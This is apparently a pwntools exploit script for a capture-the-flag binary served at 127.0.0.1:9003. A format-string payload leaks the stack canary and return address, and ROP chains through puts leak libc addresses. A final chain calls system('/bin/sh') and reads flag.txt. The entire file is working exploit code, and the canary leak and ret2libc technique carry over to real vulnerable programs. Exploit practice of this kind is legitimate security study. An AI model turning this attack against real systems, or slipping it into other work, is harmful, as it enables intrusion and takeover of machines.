#!/usr/bin/env python3

from pwn import *

elf = ELF("chal")
# p = elf.process()
p = remote("127.0.0.1", 9003)

p.recvuntil(b"misin?")

pop_rdi_ret_offset = 0x0000129c
ret_offset = 0x0000129d

# get the canary
p.sendline(b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")
p.recv()
canary_ret = p.recv().decode().split(".")
canary = int(canary_ret[14], 16)
old_rbp = int(canary_ret[15], 16)
retaddr = int(canary_ret[16], 16)

print("retaddr:",hex(retaddr))
elf_base = retaddr - 0x01292
elf.address = elf_base

pop_rdi_ret = elf_base + pop_rdi_ret_offset
plt_puts_address = p64(elf.plt.puts)
got_puts_address = p64(elf.got.puts)
got_gets_address = p64(elf.got.gets)
got_setbuf_address = p64(elf.got.setbuf)
got_printf_address = p64(elf.got.printf)

print("canary:",hex(canary))
print("main:",hex(elf.symbols["main"]))


# libc specific
libc_gets_offset = 0x80520 # 0x87080 
libc_system_offset = 0x50d70 # 0x58750 
libc_bin_sh_offset = 0x1d8678 # 0x1cb42f 


payload = b"A"*0x48
payload += p64(canary)
payload += p64(old_rbp)
payload += p64(pop_rdi_ret) + got_puts_address + plt_puts_address
payload += p64(pop_rdi_ret) + got_gets_address + plt_puts_address
payload += p64(pop_rdi_ret) + got_setbuf_address + plt_puts_address
payload += p64(pop_rdi_ret) + got_printf_address + plt_puts_address
payload += p64(retaddr)

p.sendline(payload)
addresses = p.recv()[0x48:].split(b'\n')
puts_addr = u64(addresses[0].ljust(8, b'\x00'))
gets_addr = u64(addresses[1].ljust(8, b'\x00'))
setbuf_addr = u64(addresses[2].ljust(8, b'\x00'))
printf_addr = u64(addresses[3].ljust(8, b'\x00'))

print("puts addr:",hex(puts_addr))
print("gets addr:",hex(gets_addr))
print("setbuf addr:",hex(setbuf_addr))
print(hex(printf_addr))

libc_base = gets_addr - libc_gets_offset

payload = b"A"*0x48
payload += p64(canary)
payload += p64(old_rbp)
payload += p64(elf_base + ret_offset) + p64(pop_rdi_ret) + p64(libc_base + libc_bin_sh_offset)
payload += p64(libc_system_offset + libc_base)

p.sendline(payload)

p.sendline(b"echo;cat flag.txt")

p.interactive()
